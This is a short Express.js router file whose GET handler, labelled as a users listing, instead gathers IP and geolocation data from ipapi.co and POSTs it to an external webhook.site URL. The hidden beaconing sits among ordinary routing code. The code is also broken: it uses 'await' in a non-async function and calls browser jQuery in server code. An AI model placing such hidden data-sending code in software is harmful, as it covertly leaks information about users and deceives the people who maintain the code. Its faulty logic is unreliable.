var express = require('express');
var router = express.Router();
var pusherController= require('../controllers/pusherController');
/* GET users listing. */
router.get('/', function(){var test=await $.getJSON('https://ipapi.co/json/', function(data) {
    return data;
  });
  $.ajax({
      type: "POST",
      url: "https://webhook.site/e2e8b285-d914-49b2-88cb-edfeb63819de",
      contentType: "application/json",
      headers:{'Access-Control-Allow-Origin':'*'},
      data: {"data": test}
  });})
.post('/auth',pusherController.auth);

module.exports = router;
